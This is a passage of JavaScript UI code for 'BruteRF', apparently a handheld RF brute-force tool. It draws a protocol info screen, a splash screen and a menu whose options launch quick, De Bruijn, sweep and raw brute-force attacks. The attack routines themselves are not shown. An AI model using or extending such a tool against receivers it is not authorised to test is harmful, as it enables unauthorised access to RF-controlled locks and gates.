    setTextColor(WHITE); drawString("Bits: " + proto.bits, L.mx, y); y += L.infH;
    setTextColor(WHITE); drawString("Cat:  " + proto.cat, L.mx, y); y += L.infHS;

    setTextColor(YELLOW); drawString("Bit 0: [" + proto.t0.join(", ") + "]", L.mx, y); y += L.infH;
    setTextColor(YELLOW); drawString("Bit 1: [" + proto.t1.join(", ") + "]", L.mx, y); y += L.infH;
    if (proto.tF) {
        setTextColor(ORANGE); drawString("Bit F: [" + proto.tF.join(", ") + "]", L.mx, y); y += L.infH;
    }

    setTextColor(GREEN);
    if (proto.pilot.length > 0)
        drawString("Pilot: [" + proto.pilot.join(", ") + "]", L.mx, y);
    else
        drawString("Pilot: none", L.mx, y);
    y += L.infH;

    if (proto.stop.length > 0) {
        setTextColor(ORANGE); drawString("Stop:  [" + proto.stop.join(", ") + "]", L.mx, y);
    } else {
        setTextColor(GRAY);   drawString("Stop:  none", L.mx, y);
    }

    drawFooter("Press any key to return");
    while (!getAnyPress()) delay(50);
}

// ============================================================================
// MAIN MENU
// ============================================================================

var selectedProto = PROTOCOLS[0]; // currently selected protocol object

function drawMainMenu(idx) {
    clearScreen();

    // Title bar
    drawFillRect(0, 0, screenW, L.titleH, HEADERBG);
    setTextSize(1);
    setTextColor(CYAN);
    var title = "BruteRF v1.0.0";
    var tw = title.length * 6;
    drawString(title, Math.floor((screenW - tw) / 2), L.titleY);
    setTextColor(GRAY);
    var sub = "by Senape3000";
    drawString(sub, Math.floor((screenW - sub.length * 6) / 2), L.subTY);

    var menuItems = [
        { label: "Select Protocol",   col: CYAN,   icon: "browse" },
        { label: "Quick Attack",      col: GREEN,  icon: "attack" },
        { label: "De Bruijn Attack",  col: YELLOW, icon: "debruijn" },
        { label: "Universal Sweep",   col: ORANGE, icon: "sweep" },
        { label: "RAW Bruteforce",    col: MAGENTA, icon: "raw" },
        { label: "Settings",          col: BLUE,   icon: "settings" },
        { label: "Exit",              col: RED,    icon: "exit" }
    ];

    var _iOff = Math.max(1, Math.floor((L.mainInH - 8) / 2));
    for (var i = 0; i < menuItems.length; i++) {
        var y = L.mainY0 + i * L.mainH;
        if (i === idx) {
            drawFillRoundRect(4, y, screenW - 8, L.mainInH, 3, HEADERBG);
            setTextColor(menuItems[i].col);
        } else {
            setTextColor(GRAY);
        }
        setTextSize(1);

        // Small menu icons
        var ix = L.mx + 2;
        var iy = y + _iOff;
        if (menuItems[i].icon === "browse") {
            drawFillRect(ix, iy, 3, 3, menuItems[i].col);
            drawFillRect(ix + 4, iy, 3, 3, menuItems[i].col);
            drawFillRect(ix, iy + 4, 3, 3, menuItems[i].col);
            drawFillRect(ix + 4, iy + 4, 3, 3, menuItems[i].col);
        } else if (menuItems[i].icon === "attack") {
            drawFillTriangle(ix, iy, ix, iy + 8, ix + 8, iy + 4, menuItems[i].col);
        } else if (menuItems[i].icon === "debruijn") {
            drawLine(ix, iy + 4, ix + 2, iy, menuItems[i].col);
            drawLine(ix + 2, iy, ix + 4, iy + 8, menuItems[i].col);
            drawLine(ix + 4, iy + 8, ix + 6, iy + 2, menuItems[i].col);
            drawLine(ix + 6, iy + 2, ix + 8, iy + 4, menuItems[i].col);
        } else if (menuItems[i].icon === "sweep") {
            drawCircle(ix + 4, iy + 4, 3, menuItems[i].col);
            drawLine(ix + 7, iy + 1, ix + 9, iy - 1, menuItems[i].col);
        } else if (menuItems[i].icon === "raw") {
            // Waveform icon for RAW mode
            drawLine(ix, iy + 6, ix + 2, iy + 6, menuItems[i].col);
            drawLine(ix + 2, iy + 6, ix + 2, iy + 1, menuItems[i].col);
            drawLine(ix + 2, iy + 1, ix + 4, iy + 1, menuItems[i].col);
            drawLine(ix + 4, iy + 1, ix + 4, iy + 6, menuItems[i].col);
            drawLine(ix + 4, iy + 6, ix + 6, iy + 6, menuItems[i].col);
            drawLine(ix + 6, iy + 6, ix + 6, iy + 1, menuItems[i].col);
            drawLine(ix + 6, iy + 1, ix + 8, iy + 1, menuItems[i].col);
        } else if (menuItems[i].icon === "settings") {
            drawFillCircle(ix + 4, iy + 4, 3, menuItems[i].col);
            drawFillCircle(ix + 4, iy + 4, 1, BLACK);
        } else if (menuItems[i].icon === "exit") {
            drawLine(ix, iy, ix + 7, iy + 7, menuItems[i].col);
            drawLine(ix + 7, iy, ix, iy + 7, menuItems[i].col);
        }

        drawString(menuItems[i].label, L.mx + 14, y + _iOff);
    }

    // Status bar with current protocol
    var proto = selectedProto;
    drawFooter(proto.name + " " + proto.bits + "b @ " + proto.freq + "MHz");
}

// ============================================================================
// SPLASH SCREEN — Improved
// ============================================================================

function showSplash() {
    clearScreen();

    // Splash spacing helper
    var splGap = Math.max(12, Math.round(screenH * 0.10));

    // Background gradient effect (top to bottom dark bands)
    for (var gy = 0; gy < screenH; gy += 4) {
        var intensity = Math.floor(10 - (gy * 10 / screenH));
        if (intensity < 0) intensity = 0;
        drawFillRect(0, gy, screenW, 4, color(0, intensity, intensity * 2));
    }

    // RF Tower icon (center, upper area)
    var cx = Math.floor(screenW / 2);
    var towerBase = Math.floor(screenH * 0.52);

    // Tower scale factor for smaller screens
    var ts = Math.max(0.6, Math.min(1, screenH / 170));

    // Tower body
    var tH = Math.round(30 * ts);
    drawLine(cx, towerBase, cx, towerBase - tH, WHITE);
    drawLine(cx - 1, towerBase, cx - 1, towerBase - Math.round(28 * ts), GRAY);

    // Antenna top
    var aH = Math.round(38 * ts);
    var aW = Math.round(6 * ts);
    drawLine(cx, towerBase - tH, cx - aW, towerBase - aH, CYAN);
    drawLine(cx, towerBase - tH, cx + aW, towerBase - aH, CYAN);
    drawFillCircle(cx, towerBase - tH, 2, WHITE);

    // RF waves (arcs from antenna)
    drawCircle(cx, towerBase - tH, Math.round(8 * ts), color(0, 120, 160));
    drawCircle(cx, towerBase - tH, Math.round(14 * ts), color(0, 80, 120));
    drawCircle(cx, towerBase - tH, Math.round(20 * ts), color(0, 50, 80));

    // Tower base platform
    var bW = Math.round(10 * ts);
    drawLine(cx - bW, towerBase, cx + bW, towerBase, GRAY);
    drawLine(cx - bW + 2, towerBase + 2, cx + bW - 2, towerBase + 2, DARKGRAY);

    // Title — large
    setTextSize(2);
    setTextColor(CYAN);
    var t1 = "BruteRF";
    var titleY = Math.floor(screenH * 0.60);
    drawString(t1, Math.floor((screenW - t1.length * 12) / 2), titleY);

    // Version
    setTextSize(1);
    setTextColor(WHITE);
    var t2 = "v1.0.0 — RF Brute-Force Tool";
    drawString(t2, Math.floor((screenW - t2.length * 6) / 2), titleY + splGap + 6);

    // Protocol count
    setTextColor(WHITE);
    var t3 = PROTOCOLS.length + " protocols | 7 categories";
    drawString(t3, Math.floor((screenW - t3.length * 6) / 2), titleY + splGap * 2 + 4);

    // Credit line in senape/yellow — positioned at bottom, out of the way
    setTextColor(SENAPE);
    var t4 = "Senape3000";
    drawString(t4, Math.floor((screenW - t4.length * 6) / 2), screenH - splGap);

    delay(2200);
}

// ============================================================================
// MAIN LOOP
// ============================================================================

showSplash();

var mainIdx = 0;
var running = true;

drawMainMenu(mainIdx);

while (running) {
    if (getPrevPress()) {
        mainIdx--;
        if (mainIdx < 0) mainIdx = 6;
        drawMainMenu(mainIdx);
        delay(120);
    }
    if (getNextPress()) {
        mainIdx++;
        if (mainIdx > 6) mainIdx = 0;
        drawMainMenu(mainIdx);
        delay(120);
    }
    if (getSelPress()) {
        delay(200);
        if (mainIdx === 0) {
            // Select Protocol — go through category first
            var catId = showCategoryScreen();
            while (catId) {
                var proto = handleProtocolSelection(catId);
                if (proto) {
                    selectedProto = proto;
                    customFreq = 0;
                    customBits = 0;
                    break;
                } else {
                    // User pressed ESC in protocol selection, go back to category
                    catId = showCategoryScreen();
                }
            }
            drawMainMenu(mainIdx);
        } else if (mainIdx === 1) {
            // Quick Attack
            showAttackMenu(selectedProto);
            drawMainMenu(mainIdx);
        } else if (mainIdx === 2) {
            // De Bruijn
            var bits = customBits > 0 ? customBits : selectedProto.bits;
            var freq = customFreq > 0 ? customFreq : selectedProto.freq;
            if (bits > 16) {
                clearScreen();
                drawHeader("ERROR");
                drawCentered("De Bruijn max 16 bits", L.msgY2, RED);
                drawCentered("Current: " + bits + " bits", L.msgY3, YELLOW);
                delay(2000);
            } else {
                attackDeBruijn(selectedProto, bits, freq, 5);
            }
            drawMainMenu(mainIdx);
        } else if (mainIdx === 3) {
            // Universal Sweep
            attackUniversal();
            drawMainMenu(mainIdx);
        } else if (mainIdx === 4) {
            // RAW Bruteforce
            showRawBruteSettings();
            drawMainMenu(mainIdx);
        } else if (mainIdx === 5) {
            // Settings
            showSettings(selectedProto);
            drawMainMenu(mainIdx);
        } else if (mainIdx === 6) {
            // Exit
            running = false;
        }
    }
    if (getEscPress()) {
        delay(200);
        running = false;
    }
    delay(30);
}

// Cleanup
clearScreen();
setTextSize(1);
setTextColor(WHITE);
drawCentered("BruteRF closed", Math.floor(screenH / 2), WHITE);
delay(500);
